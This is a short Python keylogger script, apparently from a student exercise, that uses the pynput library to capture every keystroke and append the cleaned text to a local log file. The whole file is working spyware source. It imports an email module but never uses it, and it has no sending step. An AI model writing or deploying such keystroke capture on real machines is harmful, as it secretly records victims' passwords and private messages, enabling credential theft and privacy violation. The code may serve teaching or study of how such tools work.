from pynput.keyboard import Listener
import re
import email

arquivoLog = "/home/alunopc02/Downloads/keylogger/key.log"

def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.*', '', tecla)

    with open(arquivoLog, "a") as log:
        log.write(tecla)

with Listener(on_press=capturar) as l:
    l.join()
    